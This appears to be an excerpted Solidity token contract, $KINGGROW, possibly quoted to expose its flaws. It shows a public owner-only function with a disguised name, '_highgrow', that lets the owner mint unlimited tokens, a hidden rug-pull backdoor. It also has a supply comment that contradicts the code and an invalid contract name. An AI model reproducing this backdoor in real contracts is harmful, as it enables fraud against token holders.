...
//
// $KINGGROW proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _highgrow(uint256 amount) public onlyOwner {
    _highgrow(msg.sender, amount);
    }
    ...
    function _highgrow(address account, uint256 amount) internal virtual {
...
contract $KINGGROW is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("KINGGROW", "KINGGROW") {
        _highgrow(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}